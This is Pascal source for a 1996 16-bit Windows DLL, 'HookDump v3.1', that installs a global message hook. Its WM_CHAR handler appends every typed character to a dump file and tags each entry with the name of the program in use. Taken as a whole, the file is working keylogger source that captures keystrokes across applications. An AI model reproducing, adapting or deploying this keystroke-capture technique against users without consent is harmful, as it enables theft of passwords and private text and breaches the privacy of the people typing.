library HookDmp;

{$D (C),96 iLya Osipov -=- HookDump v3.1 -=- ilya@kis.ru}

uses WinTypes, WinProcs, Strings, Win31, WinDos;


const Window: HWnd = 0;
      Flag:Boolean = False;

var
  lpfnNextHook:TFarProc;
  RusST:Bool;
  CodDown,CodUp:LongInt;
  F:Text;
  r:real;
  SBuf,CurProg:string;
const  Prog: PChar = '             by iLya      ';


{$I-}

Function Write(N:String):Boolean;
begin
  Append(F);
  System.Write(F,N);
  Close(F);
end;

Function OpenDump(N,Z:String):Boolean;  export;
  Begin
    {$I-}
    Assign(F,N);
    ReWrite(F);
    Close(F);
    Write(Z);
    {r:=0;
    r:=5/(r-r);}
  End;

Function CloseDump(Z:String):Boolean;  export;
  Begin
    Write(Z);
  End;

Procedure RegisterRusInd(Wnd:HWnd); export;
  begin
    Window:=Wnd;
  end;

function MsgHookProc(code:Integer; WParamq: Word;
  LParamq: Longint): Longint; export;
  var P : PMsg absolute LParamq;
  Begin

    Case P^.Message of

      WM_KEYDOWN:Begin
        {Flag:= P^.LParam=CodDown;}
      end;

      WM_KEYUp:Begin
        {if (Flag) and (P^.LParam=CodUp)
         then begin
           SetRus(R_Not);
           InvalidateRect(Window,nil,False);
         end;
        Flag:=False;}
      end;

      wm_Char:Begin
         {GetCurrentTask}
         {byte(SBuf[0]):=GetKeyNameText(P^.LParam,@SBuf[1],sizeof(Sbuf));}
         {Write('('+SBuf+','+char(P^.WParam)+')');}
         byte(SBuf[0]):=GetModuleFileName(GetCurrentTask,@SBuf[1],sizeof(SBuf));
         if SBuf<>CurProg Then begin
           CurProg:=SBuf;
           FileSplit(@CurProg[1],@SBuf,Prog,@SBuf);
           {byte(Prog[0]):=Pos(#0,Prog)-1;}
           Write(#13'['+strpas(Prog)+']'#13);
         end;
         Write(char(P^.WParam));
        end;

    End{case};

    DefHookProc(Code,wParamq,lParamq,{nil}lpfnNextHook);

  End;


  Procedure SETlpfnNextHook(P:TFarProc);  export;
  Begin
    lpfnNextHook:=P;
  End;



Exports
  MsgHookProc index 1 resident,
  SETlpfnNextHook index 2,
  OpenDump index 3 resident,
  CloseDump index 4 resident,
  RegisterRusInd index 5;

Begin
  RusST:=False;
  CodDown:=18677761;
  CodUp:=-1071841279;
End.;

